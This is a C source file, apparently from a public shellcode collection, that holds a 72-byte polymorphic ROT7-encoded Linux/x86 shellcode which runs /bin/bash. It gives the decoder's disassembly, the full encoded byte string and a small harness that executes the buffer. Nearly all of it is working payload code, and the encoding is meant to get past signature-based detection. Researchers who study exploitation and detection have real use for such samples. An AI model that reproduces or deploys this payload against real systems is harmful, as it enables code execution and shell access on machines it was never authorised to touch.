/* 
*  Title:    Polymorphic ROT7 Execve (/bin/bash) Shellcode - 72 bytes
*  Platform: Linux/x86
*  Date:     13 September 2018
*  Author:   Ray Doyle (@doylersec)
*  Website:  http://www.doyler.net
*  
*  Description: This shellcode executes /bin/bash.
*
*  For more information on this shellcode, please see the following blog post:
*  https://www.doyler.net/security-not-included/polymorphic-shellcode
*/

/****************************************************
Disassembly of section .text:

08048060 <_start>:
 8048060:	eb 1b                	jmp    804807d <call_decoder>

08048062 <decoder>:
 8048062:	5e                   	pop    esi
 8048063:	8d 7e 08             	lea    edi,[esi+0x8]
 8048066:	31 c9                	xor    ecx,ecx
 8048068:	b1 08                	mov    cl,0x8

0804806a <decode>:
 804806a:	0f 6f 07             	movq   mm0,QWORD PTR [edi]
 804806d:	0f 6f 0e             	movq   mm1,QWORD PTR [esi]
 8048070:	0f fb c1             	psubq  mm0,mm1
 8048073:	0f 7f 07             	movq   QWORD PTR [edi],mm0
 8048076:	83 c7 08             	add    edi,0x8
 8048079:	e2 ef                	loop   804806a <decode>
 804807b:	eb 0d                	jmp    804808a <Shellcode>

0804807d <call_decoder>:
 804807d:	e8 e0 ff ff ff       	call   8048062 <decoder>

08048082 <decoder_value>:
 8048082:	07                   	pop    es
 8048083:	07                   	pop    es
 8048084:	07                   	pop    es
 8048085:	07                   	pop    es
 8048086:	07                   	pop    es
 8048087:	07                   	pop    es
 8048088:	07                   	pop    es
 8048089:	07                   	pop    es

0804808a <Shellcode>:
 804808a:	38 c7                	cmp    bh,al
 804808c:	57                   	push   edi
 804808d:	6f                   	outs   dx,DWORD PTR ds:[esi]
 804808e:	69 68 7a 6f 6f 69 70 	imul   ebp,DWORD PTR [eax+0x7a],0x70696f6f
 8048095:	75 36                	jne    80480cd <Shellcode+0x43>
 8048097:	6f                   	outs   dx,DWORD PTR ds:[esi]
 8048098:	36                   	ss
 8048099:	36                   	ss
 804809a:	36                   	ss
 804809b:	36                   	ss
 804809c:	90                   	nop
 804809d:	ea 57 90 e9 5a 90 e8 	jmp    0xe890:0x5ae99057
 80480a4:	b7 12                	mov    bh,0x12
 80480a6:	d4 87                	aam    0x87
****************************************************/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x1b\x5e\x8d\x7e\x08\x31\xc9\xb1\x08\x0f\x6f\x07\x0f\x6f\x0e\x0f\xfb\xc1\x0f\x7f\x07\x83\xc7\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\x07\x07\x07\x07\x07\x07\x07\x07\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87\x97\x97";

main()
{
    printf("Shellcode Length: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}